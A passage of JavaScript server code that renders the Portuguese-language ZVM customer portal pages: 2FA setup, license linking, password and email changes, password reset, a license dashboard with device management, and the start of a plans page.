        <div class="auth-field"><label for="twofa-off-code">Código para confirmar desativação</label><input id="twofa-off-code" type="text" name="code" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" required autocomplete="one-time-code" class="auth-code-input"></div>
        <button type="submit" class="auth-submit danger">Desativar 2FA</button>
      </form>
      <div class="auth-switch"><a href="/cliente">← Voltar ao painel</a></div>`;
  } else if (pendingSecret) {
    const setupKey = escHtml(String(pendingSecret).toUpperCase().replace(/(.{4})/g, '$1 ').trim());
    content = `
      <h2>Ativar 2FA</h2>
      <p class="auth-form-hint">No Google Authenticator, Authy ou outro autenticador, escolha <strong>Inserir chave de configuração</strong>, use o e-mail da conta como nome e informe a chave abaixo. Ela é exibida somente nesta configuração e nunca é enviada a um serviço de QR externo.</p>
      ${errHtml}
      <div class="auth-setup-key"><div class="auth-setup-key-label">Chave de configuração</div><code class="auth-setup-key-code">${setupKey}</code><p class="auth-setup-key-hint">Válida por 15 minutos · Tipo: baseado em tempo (TOTP)</p></div>
      <form method="POST" action="/cliente/2fa/ativar">
        <div class="auth-field"><label for="twofa-on-code">Código de 6 dígitos</label><input id="twofa-on-code" type="text" name="code" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" required autocomplete="one-time-code" class="auth-code-input"></div>
        <button type="submit" class="auth-submit">Ativar 2FA<span class="auth-spinner" aria-hidden="true"></span></button>
      </form>
      <div class="auth-switch"><a href="/cliente">Cancelar</a></div>`;
  } else if (ok) {
    content = `
      <h2>2FA ativado</h2>
      ${okHtml}
      <div class="auth-switch auth-switch-tight"><a href="/cliente">← Voltar ao painel</a></div>`;
  } else {
    content = `
      <h2>Não foi possível carregar</h2>
      ${errHtml || `<div class="auth-alert err">Erro ao gerar configuração.</div>`}
      <div class="auth-switch"><a href="/cliente/2fa/setup">Tentar novamente</a></div>`;
  }
  return renderClientWorkspacePage({portalUser:user,active:'security',eyebrow:'Segurança',title:'Autenticação em duas etapas',subtitle:'Proteja sua conta com um código temporário além da senha.',content});
}

// ── Subpáginas de conta standalone (vincular/senha/email) — mesmo
// auth-shell do login/2FA. NÃO reaproveitam renderPortalLinkKey/
// renderPortalChangePwd/renderPortalChangeEmail (essas continuam
// Contrato
// preservado: mesmos endpoints, mesmos name= de campo, mesma sessão/
// validação/rate-limit — só a view muda.
function renderStandalonePortalLinkKey(err = '', ok = '', portalUser = null) {
  const errHtml = err ? `<div class="auth-alert err" role="alert">⚠ ${escHtml(err)}</div>` : '';
  const okHtml = ok ? `<div class="auth-alert ok" role="status">✅ ${escHtml(ok)}</div>` : '';
  const content=`<div class="auth-form-card"><h2>Vincular chave</h2><p class="auth-form-hint">Associe uma licença existente à sua conta. O portal passa a mostrar validade, plano e dispositivos imediatamente.</p>${errHtml}${okHtml}<form method="POST" action="/cliente/vincular"><div class="auth-field"><label for="link-keycode">Código da chave</label><input id="link-keycode" type="text" name="keycode" placeholder="zv-xxxxx-xxxxx-xxxxx" maxlength="30" pattern="[a-z0-9\\-]+" required autocomplete="off"><div class="auth-field-hint">Use exatamente o código recebido na compra ou no atendimento.</div></div><button type="submit" class="auth-submit">Vincular chave<span class="auth-spinner" aria-hidden="true"></span></button></form><div class="auth-switch"><a href="/cliente">← Voltar à visão geral</a></div></div>`;
  return renderClientWorkspacePage({portalUser,active:'license',eyebrow:'Licença',title:'Vincular uma chave ZVM',subtitle:'Centralize sua licença, validade, plano e dispositivos dentro da mesma conta.',content,aside:`<div class="client-app-mini"><span>Licença</span><strong>Vinculação imediata</strong><p>Depois de validada, a chave passa a aparecer na visão geral da conta.</p></div><div class="client-app-mini"><span>Segurança</span><strong>Uma chave por conta</strong><p>Se a chave já estiver vinculada a outra conta, o portal bloqueia a associação.</p></div>`});
}

function renderStandalonePortalChangePwd(err = '', ok = '', portalUser = null) {
  const errHtml = err ? `<div class="auth-alert err" role="alert">⚠ ${escHtml(err)}</div>` : '';
  const okHtml = ok ? `<div class="auth-alert ok" role="status">✅ ${escHtml(ok)}</div>` : '';
  const content=`<div class="auth-form-card"><h2>Alterar senha</h2><p class="auth-form-hint">Troque sua senha sem sair do portal. A senha atual é exigida antes de salvar.</p>${errHtml}${okHtml}<form method="POST" action="/cliente/senha"><div class="auth-field"><label for="pwd-old">Senha atual</label><input id="pwd-old" type="password" name="old" required autocomplete="current-password"></div><div class="auth-field"><label for="pwd-new">Nova senha</label><input id="pwd-new" type="password" name="pass" required minlength="8" autocomplete="new-password"><div class="auth-field-hint">Pelo menos 8 caracteres.</div></div><div class="auth-field"><label for="pwd-new2">Confirmar nova senha</label><input id="pwd-new2" type="password" name="pass2" required minlength="8" autocomplete="new-password"></div><button type="submit" class="auth-submit">Salvar nova senha<span class="auth-spinner" aria-hidden="true"></span></button></form><div class="auth-switch"><a href="/cliente">← Voltar à visão geral</a></div></div>`;
  return renderClientWorkspacePage({portalUser,active:'password',eyebrow:'Segurança',title:'Senha da conta',subtitle:'Mantenha uma credencial forte e exclusiva para o Portal do Cliente e a extensão.',content:content+_SCRIPT_PWD_TOGGLE,aside:`<div class="client-app-mini"><span>Recomendação</span><strong>Senha exclusiva</strong><p>Evite reutilizar a mesma senha de e-mail ou outros serviços.</p></div><div class="client-app-mini"><span>2FA</span><strong>Adicione uma segunda camada</strong><p>Ative a autenticação em duas etapas para proteger ainda mais a conta.</p></div>`});
}

function renderStandalonePortalChangeEmail(err = '', ok = '', portalUser = null) {
  const errHtml = err ? `<div class="auth-alert err" role="alert">⚠ ${escHtml(err)}</div>` : '';
  const okHtml = ok ? `<div class="auth-alert ok" role="status">✅ ${escHtml(ok)}</div>` : '';
  const content=`<div class="auth-form-card"><h2>Alterar e-mail</h2><p class="auth-form-hint">Seu e-mail identifica a conta e ajuda a vincular compras e renovações.</p>${errHtml}${okHtml}<form method="POST" action="/cliente/email"><div class="auth-field"><label for="email-new">Novo e-mail</label><input id="email-new" type="email" name="newemail" required maxlength="120" autocomplete="email"><div class="auth-field-hint">Use o mesmo e-mail na compra para facilitar a vinculação automática.</div></div><div class="auth-field"><label for="email-new2">Confirmar novo e-mail</label><input id="email-new2" type="email" name="newemail2" required maxlength="120" autocomplete="email"></div><div class="auth-field"><label for="email-pass">Senha atual</label><input id="email-pass" type="password" name="pass" required autocomplete="current-password"></div><button type="submit" class="auth-submit">Salvar novo e-mail<span class="auth-spinner" aria-hidden="true"></span></button></form><div class="auth-switch"><a href="/cliente">← Voltar à visão geral</a></div></div>`;
  return renderClientWorkspacePage({portalUser,active:'email',eyebrow:'Conta',title:'E-mail da conta',subtitle:'Mantenha seu identificador principal atualizado para compras, renovações e recuperação.',content:content+_SCRIPT_PWD_TOGGLE,aside:`<div class="client-app-mini"><span>Compras</span><strong>Mesmo e-mail na Cakto</strong><p>Isso facilita a associação automática da compra à sua conta ZVM.</p></div><div class="client-app-mini"><span>Confirmação</span><strong>Sua senha é obrigatória</strong><p>A troca não acontece sem confirmar a credencial atual.</p></div>`});
}

// ── Recuperação de senha standalone (mesmo auth-shell, nav mínima).
// Contrato preservado: mesmos endpoints e mesmos name= de campo
// (email; token/pass/pass2). A orientação visual acompanha o runtime: com
// RESEND configurado, o link é enviado por e-mail; sem ele, o suporte é o
// canal de entrega do link gerado.
function renderStandalonePortalResetRequest(err = '', ok = '') {
  const errHtml = err ? `<div class="auth-alert err" role="alert">⚠ ${escHtml(err)}</div>` : '';
  const okHtml = ok ? `<div class="auth-alert ok" role="status">✅ ${escHtml(ok)}</div>` : '';
  const benefitsHtml = AUTH_BENEFITS.map(([icon, text]) => `<li><span class="auth-benefit-icon" aria-hidden="true">${icon}</span><span>${text}</span></li>`).join('');
  const resetHint = RESEND_API_KEY
    ? 'Se o e-mail estiver cadastrado, enviaremos um link de recuperação. Verifique também a caixa de spam.'
    : 'Se o e-mail estiver cadastrado, o link será gerado e poderá ser solicitado ao suporte oficial.';
  return `<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ZVM — Recuperar Senha</title><link rel="icon" type="image/svg+xml" href="${_FAV}">
${_CSS_SHARED}${_CSS_STANDALONE}${_CSS_AUTH}${_CSS_SYSTEM}</head>
<body class="zvm-auth-premium">${_sharedNav({ variant: 'auth' })}
<main id="main-content" class="auth-shell">
  <div class="auth-promo">
    <div class="auth-promo-inner">
      <div class="auth-eyebrow">Portal do Cliente</div>
      <h1>Recupere o acesso à sua <em>conta</em></h1>
      <p class="auth-promo-sub">Informe o e-mail da sua conta ZVM para receber instruções de redefinição de senha.</p>
      <ul class="auth-benefits">${benefitsHtml}</ul>
    </div>
  </div>
  <div class="auth-form-wrap">
    <div class="auth-form-card">
      <div class="auth-form-brand">${renderStandaloneBrand('auth')}</div>
      <h2>Esqueci minha senha</h2>
      ${errHtml}${okHtml}
      ${ok ? '' : `
      <p class="auth-form-hint">${resetHint}</p>
      <form method="POST" action="/cliente/recuperar">
        <div class="auth-field"><label for="reset-email">E-mail</label><input id="reset-email" type="email" name="email" placeholder="seu@email.com" required autocomplete="email"></div>
        <button type="submit" class="auth-submit">Solicitar recuperação<span class="auth-spinner" aria-hidden="true"></span></button>
      </form>`}
      <div class="auth-switch"><a href="/cliente">← Voltar ao login</a></div>
    </div>
  </div>
</main>
${_standaloneFoot()}
${_SCRIPT_AUTH_SUBMIT_LOCK}
</body></html>`;
}

function renderStandalonePortalResetForm(err = '', ok = '', token = '') {
  const errHtml = err ? `<div class="auth-alert err" role="alert">⚠ ${escHtml(err)}</div>` : '';
  const okHtml = ok ? `<div class="auth-alert ok" role="status">✅ ${escHtml(ok)}</div>` : '';
  const benefitsHtml = AUTH_BENEFITS.map(([icon, text]) => `<li><span class="auth-benefit-icon" aria-hidden="true">${icon}</span><span>${text}</span></li>`).join('');
  return `<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ZVM — Redefinir Senha</title><link rel="icon" type="image/svg+xml" href="${_FAV}">
${_CSS_SHARED}${_CSS_STANDALONE}${_CSS_AUTH}${_CSS_SYSTEM}</head>
<body class="zvm-auth-premium">${_sharedNav({ variant: 'auth' })}
<main id="main-content" class="auth-shell">
  <div class="auth-promo">
    <div class="auth-promo-inner">
      <div class="auth-eyebrow">Portal do Cliente</div>
      <h1>Defina uma nova <em>senha</em></h1>
      <p class="auth-promo-sub">Escolha uma senha forte para proteger o acesso à sua conta ZVM.</p>
      <ul class="auth-benefits">${benefitsHtml}</ul>
    </div>
  </div>
  <div class="auth-form-wrap">
    <div class="auth-form-card">
      <div class="auth-form-brand">${renderStandaloneBrand('auth')}</div>
      <h2>Redefinir senha</h2>
      ${errHtml}${okHtml}
      ${ok ? `<div class="auth-switch auth-switch-tight"><a href="/cliente">Entrar agora →</a></div>` : `
      <form method="POST" action="/cliente/redefinir">
        <input type="hidden" name="token" value="${escHtml(token)}">
        <div class="auth-field"><label for="reset-pass">Nova senha</label><input id="reset-pass" type="password" name="pass" required minlength="8" placeholder="Mínimo 8 caracteres" autocomplete="new-password"></div>
        <div class="auth-field"><label for="reset-pass2">Confirmar senha</label><input id="reset-pass2" type="password" name="pass2" required minlength="8" placeholder="Repita a senha" autocomplete="new-password"></div>
        <button type="submit" class="auth-submit">Salvar nova senha<span class="auth-spinner" aria-hidden="true"></span></button>
      </form>
      <div class="auth-switch"><a href="/cliente">← Voltar ao login</a></div>`}
    </div>
  </div>
</main>
${_standaloneFoot()}
${_SCRIPT_PWD_TOGGLE}
${_SCRIPT_AUTH_SUBMIT_LOCK}
</body></html>`;
}


function portalUiIcon(name){
  const icons={
    overview:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 11.5 12 5l8 6.5"/><path d="M6.5 10.5V20h11v-9.5"/><path d="M10 20v-5h4v5"/></svg>',
    plans:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 7v5h-5"/><path d="M4 17v-5h5"/><path d="M6.1 8.1A7 7 0 0 1 18.7 7L20 12"/><path d="M17.9 15.9A7 7 0 0 1 5.3 17L4 12"/></svg>',
    security:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3 5 6v5c0 4.6 2.9 8.2 7 10 4.1-1.8 7-5.4 7-10V6l-7-3Z"/><path d="m9.5 12 1.7 1.7 3.5-3.7"/></svg>',
    license:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="7.5" cy="15.5" r="3.5"/><path d="m10 13 8-8 2 2-2 2 1.5 1.5-2 2L16 11l-4 4"/></svg>',
    password:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="5" y="10" width="14" height="10" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/><circle cx="12" cy="15" r="1"/></svg>',
    email:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m4 7 8 6 8-6"/></svg>',
    support:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 13a8 8 0 0 1 16 0"/><path d="M4 13v4a2 2 0 0 0 2 2h1v-6H4Zm16 0v4a2 2 0 0 1-2 2h-1v-6h3Z"/><path d="M17 19c-1 1.3-2.7 2-5 2"/></svg>'
  };
  return icons[name]||icons.overview;
}

const ZVM_SITE_VERSION = require('./package.json').version;
function renderClientAccountIdentity(user) {
  const firstName = String(user?.name || user?.email || 'Cliente').trim().split(/\s+/)[0] || 'Cliente';
  const email = String(user?.email || '').trim();
  return `<span class="dash-account-identity"><span class="dash-topbar-name">${escHtml(firstName)}</span>${email ? `<span class="dash-topbar-email" title="${escHtml(email)}">${escHtml(email)}</span>` : ''}</span>`;
}

function renderClientPortalRail(active='overview'){
  const items=[
    ['overview','Visão geral','/cliente'],
    ['plans','Renovações e planos','/cliente/planos'],
    ['security','Segurança','/cliente/2fa/setup'],
    ['license','Licença','/cliente/vincular'],
    ['password','Senha','/cliente/senha'],
    ['email','E-mail','/cliente/email']
  ];
  const links=items.map(([id,label,href])=>`<a href="${href}" class="${active===id?'active':''}"${active===id?' aria-current="page"':''}><span class="client-nav-icon">${portalUiIcon(id)}</span><span>${label}</span></a>`).join('');
  return `<aside class="client-rail" aria-label="Navegação da conta">
    <div class="client-rail-brand">
      <div class="client-rail-logo owner-panel-rail-brand">${renderCanonicalOwnerBrand()}</div>
      <div class="client-rail-brand-copy"><div class="client-rail-brand-caption">Portal do Cliente</div><strong>Conta premium</strong></div>
    </div>
    <nav class="client-nav">${links}<a href="${ZVM_SUPPORT_URL}" target="_blank" rel="noopener noreferrer"><span class="client-nav-icon">${portalUiIcon('support')}</span><span>Suporte</span></a></nav>
    <div class="client-rail-card" aria-label="Resumo do portal"><strong>Sua conta ZVM</strong><p>Licença, dispositivos, pagamentos e segurança em um só lugar.</p></div>
    <div class="client-rail-version">Portal do Cliente · v${escHtml(ZVM_SITE_VERSION)}</div>
  </aside>`;
}

function renderChromeStoreBadge(){
  return `<a class="chrome-store-banner" href="${ZVM_CHROME_STORE_URL}" target="_blank" rel="noopener noreferrer" aria-label="Instalar a ZVM pela Chrome Web Store">
    <span class="chrome-store-mark" aria-hidden="true"><svg viewBox="0 0 48 48"><path fill="#e94235" d="M24 4a20 20 0 0 1 17.3 10H24a10 10 0 0 0-8.7 5L9.5 9A19.9 19.9 0 0 1 24 4Z"/><path fill="#fabb05" d="M41.3 14A20 20 0 0 1 24 44l8.7-15A10 10 0 0 0 34 24c0-1.8-.5-3.5-1.3-5l8.6-5Z"/><path fill="#34a853" d="M24 44A20 20 0 0 1 9.5 9l8.7 15A10 10 0 0 0 24 34h8.7L24 44Z"/><circle cx="24" cy="24" r="8" fill="#4285f4"/><circle cx="24" cy="24" r="5.4" fill="#8ab4f8"/></svg></span>
    <span class="chrome-store-copy"><small>Disponível na Chrome Web Store</small><strong>ZVM - Automações</strong><span>Extensão oficial</span></span>
    <span class="chrome-store-arrow" aria-hidden="true">↗</span>
  </a>`;
}

function renderStandalonePortalDashboard(user, keyData, okMsg='', deviceMsg='') {
  const now = new Date();

  // ── Key status computation ───────────────────────────────────────
  let active = false, deferred = false, expired = false, expiringSoon = false;
  let expTxt = '—', expBadge = 'bd-muted', devUsed = 0, devMax = 1;
  let diffH = null;

  if (keyData) {
    deferred = !!(keyData.expireDuration && !keyData.expiresAt);
    if (keyData.expiresAt) {
      diffH = Math.floor((new Date(keyData.expiresAt) - now) / 3600000);
      expired = diffH < 0;
    }
    active = !expired && !deferred && keyData.active !== false;
    expiringSoon = !expired && diffH !== null && diffH < 48;
    devUsed = (keyData.phones || []).length;
    devMax  = keyData.maxUses === -1 ? null : (keyData.maxUses || 1);

    if (deferred)       { expTxt = 'Ativa ao primeiro uso'; expBadge = 'bd-blue'; }
    else if (expired)   { expTxt = 'Expirada'; expBadge = 'bd-red'; }
    else if (!keyData.expiresAt) { expTxt = 'Sem expiração'; expBadge = 'bd-green'; }
    else if (diffH < 1) { expTxt = 'Menos de 1h restante'; expBadge = 'bd-red'; }
    else if (diffH < 24){ expTxt = `${diffH}h restantes`; expBadge = 'bd-orange'; }
    else if (diffH < 48){ expTxt = `${diffH}h restantes`; expBadge = 'bd-orange'; }
    else {
      const diffD = Math.floor(diffH / 24);
      const d = new Date(keyData.expiresAt);
      expTxt = `${d.toLocaleDateString('pt-BR')} · ${diffD} dia${diffD!==1?'s':''} restantes`;
      expBadge = 'bd-green';
    }
  }

  // ── Urgência de renovação (aditivo — não altera expTxt/expBadge acima,
  // usados pelo resumo da conta; só decide se/qual banner de alerta mostrar) ──
  let expiryTier = null; // null | 'leve' (<=7d) | 'forte' (<=72h) | 'critico' (expirada)
  if (keyData && !deferred) {
    if (expired) expiryTier = 'critico';
    else if (diffH !== null) {
      if (diffH < 72) expiryTier = 'forte';
      else if (diffH < 168) expiryTier = 'leve';
    }
  }
  const expiryAlert = expiryTier ? `<div class="expiry-alert ${expiryTier}" role="status">
    <span class="expiry-alert-icon" aria-hidden="true">${expiryTier==='critico'?'⛔':'⚠'}</span>
    <span class="expiry-alert-text">${expiryTier==='critico'?'Sua licença expirou.':expiryTier==='forte'?'Sua licença vence em menos de 72 horas.':'Sua licença vence em menos de 7 dias.'}${ZVM_SALES_PAUSED?' Vendas e renovações temporariamente suspensas.':''}</span>
    <a href="/cliente/planos" class="expiry-alert-cta">${ZVM_SALES_PAUSED?'Consultar planos':'Renovar agora'}</a>
  </div>` : '';

  // ── Status pill ──────────────────────────────────────────────────
  const mainStatusClass = expired ? 'bd-red' : deferred ? 'bd-blue' : active ? 'bd-green' : 'bd-red';
  const mainStatusTxt   = expired ? 'Expirada' : deferred ? 'Aguardando 1º uso' : active ? 'Ativa' : 'Inativa';
  const mainStatusGlow  = expired ? '#f0506044' : deferred ? '#5588ff44' : active ? '#00e67644' : '#f0506044';
  const planName = keyData ? displayLicensePlan({planId:keyData.planId,planLabel:keyData.planName,maxUses:keyData.maxUses}).label : '';
  const expiryDateText = keyData?.expiresAt && Number.isFinite(new Date(keyData.expiresAt).getTime())
    ? new Date(keyData.expiresAt).toLocaleDateString('pt-BR') : deferred ? 'No primeiro uso' : 'Sem expiração';

  // ── Barra de validade — percentual real só quando createdAt E expiresAt
  // existem e formam um intervalo válido (nunca um valor inventado). Sem
  // isso, a barra vira só um indicador binário de urgência (cheia/vazia).
  let validityBarPct = null;
  if (keyData && keyData.createdAt && keyData.expiresAt) {
    const createdMs = new Date(keyData.createdAt).getTime();
    const expiresMs = new Date(keyData.expiresAt).getTime();
    if (Number.isFinite(createdMs) && Number.isFinite(expiresMs) && expiresMs > createdMs) {
      validityBarPct = Math.max(0, Math.min(100, Math.round(((expiresMs - now.getTime()) / (expiresMs - createdMs)) * 100)));
    }
  }
  const validityBarColor = expired ? '#f05060' : (expiryTier === 'forte' || expiryTier === 'leve') ? '#f0b429' : '#00e676';

  // ── No-key state ─────────────────────────────────────────────────
  const noKeySection = !keyData ? `
  <div class="dash-nokey">
    <div class="nokey-icon" aria-hidden="true">◇</div>
    <div class="nokey-title">Nenhuma chave vinculada</div>
    <div class="nokey-sub">Escolha um plano para receber sua licença por e-mail ou vincule uma chave que você já possui.</div>
    <div class="nokey-actions"><a href="/cliente/planos" class="nokey-cta">Ver planos</a><a href="/cliente/vincular" class="nokey-link">Vincular uma chave</a></div>
  </div>` : '';

  // ── Chrome Web Store oficial ────────────────────────────────────
  // O portal não expõe mais versão de build local/antiga. A origem oficial
  // da instalação é sempre a página pública da ZVM na Chrome Web Store.
  const updateBanner = renderChromeStoreBadge();

  const hasKey = !!keyData;
  const has2fa = portalTotpHasSecret(user);
  // String(): registros de portal_users criados por importação/webhook podem não ter
  // "name"; .split de undefined derrubava o dashboard inteiro para "Erro temporário".
  const fullName = String(user.name || '').trim();
  // Iniciais pro avatar padrão (fallback quando o cliente não escolheu preset).
  // Nunca via innerHTML — só texto, calculado aqui e escapado como qualquer outro campo.
  const initials = escHtml(fullName
    ? fullName.split(/\s+/).filter(Boolean).slice(0, 2).map(p => p[0]).join('').toUpperCase()
    : (user.email ? user.email[0].toUpperCase() : '?'));

  // Dispositivos cadastrados — só phones (número + posição do slot), nunca
  // IP/versão do WPP/último acesso técnico (isso fica só no painel admin).
  const deviceListHtml = (keyData && (keyData.phones||[]).length)
    ? (keyData.phones||[]).map((phone,index)=>`<div class="device-row"><div class="device-num" aria-hidden="true">#${index+1}</div><div class="device-info"><div class="device-phone">${escHtml(phone)}</div><div class="device-meta">Slot ${index+1} de ${devMax||'∞'}</div></div><form method="POST" action="/cliente/dispositivos/remover" data-confirm="Remover este número da licença? O dispositivo perderá o acesso."><input type="hidden" name="keyCode" value="${escHtml(keyData.code||'')}"><input type="hidden" name="phone" value="${escHtml(phone)}"><button type="submit" class="device-remove" aria-label="Remover número ${escHtml(phone)}">Remover</button></form></div>`).join('')
    : '<div class="device-empty">Nenhum número vinculado. O primeiro acesso da extensão ocupará um slot.</div>';

  // ── Bloco de contagem regressiva — só existe pra chaves não-deferred com
  // expiresAt real (mesma condição usada há uma rodada; um único timer,
  // sem countdown concorrente). Deferred mostra uma nota, sem inventar uma
  // data que ainda não existe.
  const countdownBlock = (keyData && !deferred) ? `
    <div class="countdown-block">
      <div class="ks-label">Tempo restante</div>
      <div class="countdown-grid" id="license-countdown-grid" data-expires="${escHtml(keyData.expiresAt||'')}">
        <div class="cd-box"><span class="cd-num" data-cd="d">—</span><span class="cd-lbl">dias</span></div>
        <div class="cd-box"><span class="cd-num" data-cd="h">—</span><span class="cd-lbl">horas</span></div>
        <div class="cd-box"><span class="cd-num" data-cd="m">—</span><span class="cd-lbl">min</span></div>
        <div class="cd-box"><span class="cd-num" data-cd="s">—</span><span class="cd-lbl">seg</span></div>
      </div>
      <div class="validity-bar"><div class="validity-bar-fill" id="validity-bar-fill" data-width="${expired ? 0 : (validityBarPct ?? 100)}" data-color="${escHtml(validityBarColor)}"></div></div>
    </div>` : (keyData && deferred) ? `
    <div class="countdown-block">
      <div class="ks-label">Tempo restante</div>
      <div class="countdown-note">Sua licença ativa ao primeiro uso — a contagem começa quando você conectar o primeiro número.</div>
    </div>` : '';

  const body = `

<div class="client-shell">
${renderClientPortalRail('overview')}
<main id="main-content" class="client-main" tabindex="-1">
<div class="dash-topbar">
  <div class="dash-page-heading"><span>ZVM · Área do cliente</span><h1>Minha conta</h1><p>Acesso, validade e dispositivos em um só lugar.</p></div>
  <div class="dash-topbar-user">
    ${renderClientAccountIdentity(user)}
    <a href="/cliente/logout" class="dash-logout">Sair da conta</a>
  </div>
</div>

${updateBanner}
${okMsg ? `<div class="client-ok-banner" role="status" aria-live="polite">✅ ${escHtml(okMsg)}</div>` : ''}
${deviceMsg ? `<div class="device-warning" role="alert">⚠ ${escHtml(deviceMsg)} <a href="/cliente">Atualizar dispositivos</a></div>` : ''}
${noKeySection}

${keyData ? `<section class="client-quickfacts" aria-label="Resumo da licença">
  <div class="client-quickfact">
    <span class="client-qf-label">Situação da licença</span>
    <strong>${escHtml(mainStatusTxt)}</strong>
    <small>${escHtml(planName)} · Plano atual</small>
  </div>
  <div class="client-quickfact">
    <span class="client-qf-label">Dispositivos vinculados</span>
    <strong>${devUsed} ${devMax === null ? 'de ilimitados' : 'de '+devMax}</strong>
    <small>${devMax === null ? 'Sem limite de dispositivos' : 'Números ligados à sua licença'}</small>
  </div>
  <div class="client-quickfact">
    <span class="client-qf-label">Validade</span>
    <strong>${escHtml(expiryDateText)}</strong>
    <small>${escHtml(expTxt)}</small>
  </div>
</section>` : ''}

<div class="client-command-grid">
  <section class="client-license-focus">
    <div class="client-focus-kicker">Chave principal</div>
    <div class="client-license-head"><div><h2>${keyData ? 'ZVM '+escHtml(planName) : 'Nenhuma chave vinculada'}</h2><p>${keyData ? 'Sua chave concentra o que importa: acesso, validade, tempo restante, renovação e desvinculação.' : 'Vincule uma chave existente ou escolha um plano para começar.'}</p></div>${keyData ? `<span class="${mainStatusClass}"><span class="bd-dot"></span>${mainStatusTxt}</span>` : ''}</div>
    ${keyData ? `<button type="button" class="client-key-command" id="copy-license-key" data-key="${escHtml(keyData.code||'')}" title="Copiar chave"><span class="client-key-value">${escHtml(keyData.code||'')}</span><span class="key-copy-hint">Copiar chave</span></button>` : `<a href="/cliente/vincular" class="client-key-empty">Vincular uma chave ZVM →</a>`}
    ${expiryAlert}
    ${countdownBlock}
    <div class="client-focus-actions">
      <a class="primary" href="/cliente/planos">${ZVM_SALES_PAUSED?'Consultar planos':'Renovar / mudar plano'}</a>
      <a href="/cliente/2fa/setup">🛡 Segurança</a>
      ${hasKey ? `<form method="POST" action="/cliente/desvincular" data-confirm="Tem certeza? Isso desvinculará sua chave desta conta."><button type="submit" class="client-unlink">🔓 Desvincular chave</button></form>` : ''}
    </div>
  </section>

  <section class="client-devices-focus">
    <div class="client-devices-head"><div><span>Dispositivos vinculados</span><h2>Números com acesso</h2></div>${keyData ? `<span class="panel-hdr-badge">${devUsed}${devMax?'/'+devMax:''}</span>` : ''}</div>
    <p class="client-devices-intro">Gerencie os números ligados à licença sem abrir outra tela. Remover libera o slot imediatamente.</p>
    <div class="client-device-list">${keyData ? deviceListHtml : '<div class="device-empty">Vincule uma chave para gerenciar dispositivos.</div>'}</div>
  </section>
</div>

<div class="client-account-tools" aria-label="Atalhos da conta">
  <a class="client-tool" href="/cliente/senha"><span class="client-tool-icon">${portalUiIcon('password')}</span><div><strong>Senha</strong><span>Trocar credencial de acesso</span></div></a>
  <a class="client-tool" href="/cliente/email"><span class="client-tool-icon">${portalUiIcon('email')}</span><div><strong>E-mail</strong><span>Atualizar identidade da conta</span></div></a>
  <a class="client-tool" href="/cliente/2fa/setup"><span class="client-tool-icon">${portalUiIcon('security')}</span><div><strong>2FA</strong><span>${has2fa ? 'Proteção adicional ativa' : 'Ativar proteção adicional'}</span></div></a>
  <a class="client-tool" href="${ZVM_SUPPORT_URL}" target="_blank" rel="noopener noreferrer"><span class="client-tool-icon">${portalUiIcon('support')}</span><div><strong>Suporte</strong><span>Falar com atendimento ZVM</span></div></a>
</div>

</main>
</div>
`;
  return renderPortalPage(body, 'ZVM — Minha Conta');
}


function renderStandalonePortalPlans(user, keyData){
  const currentPlanId=String(keyData?.planId||'');
  // Preserve renewal for an existing historic contract independently of new v2 offers.
  const renewalPlan = Object.prototype.hasOwnProperty.call(ZVM_PLANS,currentPlanId) ? ZVM_PLANS[currentPlanId] : null;
  const legacyRenewal = !ZVM_SALES_PAUSED && renewalPlan && keyData?.planId
    ? `<section class="client-legacy-renewal" aria-label="Renovação do contrato vigente" style="margin:16px auto;padding:18px;max-width:960px;border:1px solid var(--border,#295247);border-radius:14px;">
      <h2 style="font-size:18px;margin:0 0 8px;">Renovar contrato anterior</h2>
      <p style="margin:0 0 12px;">Sua licença atual é do plano ${escHtml(displayLicensePlan({planId:currentPlanId,maxUses:keyData?.maxUses}).label)}. Você pode renovar esse contrato sem migrar automaticamente para os novos planos.</p>
      <a class="plan-btn plan-btn-outline" href="${escHtml(checkoutUrlForPortal(renewalPlan.checkoutUrl,user?.keyCode,user?.email,APP_SECRET))}" target="_blank" rel="noopener noreferrer">Renovar meu contrato atual</a>
    </section>` : '';
  const cards=Object.values(ZVM_PUBLIC_PLANS).map(plan=>{
    const price=formatPlanPrice(plan.price);
    const perDevice=plan.consult?'':(plan.price/plan.maxUses).toFixed(2).replace('.',',');
    const popular=plan.id==='pro_v2';
    const isCurrent=currentPlanId===plan.id;
    const identity=PLAN_IDENTITY[plan.id]||{subtitle:plan.subtitle||''};
    const action = plan.consult
      ? ''
      : ZVM_SALES_PAUSED
        ? '<button type="button" class="plan-btn plan-btn-outline" disabled aria-disabled="true">Vendas temporariamente pausadas</button>'
        : !plan.enabled
          ? '<button type="button" class="plan-btn plan-btn-outline" disabled title="Aguardando liberação do checkout Cakto">Compra indisponível no momento</button>'
